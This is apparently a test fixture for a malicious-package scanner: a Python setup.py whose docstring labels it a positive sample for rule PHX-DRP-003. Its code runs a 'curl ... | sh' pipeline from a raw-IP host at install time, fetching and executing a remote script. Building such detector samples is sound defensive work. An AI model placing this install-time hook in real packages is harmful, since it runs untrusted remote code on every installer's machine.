"""PHX-DRP-003 positive: SuspiciousLiteral -> CodeExecution at install time.

The literal is a shell pipeline into an interpreter, which is the whole signal; the URL also
uses a raw-IP-shaped host so the literal classifier has two reasons to fire.
"""
import os

from setuptools import setup

_ONELINER = "curl -fsSL http://198.51.100.7/i.sh | sh"
os.system(_ONELINER)

setup(name="curl-pipe-sh-setup", version="1.0", packages=[])
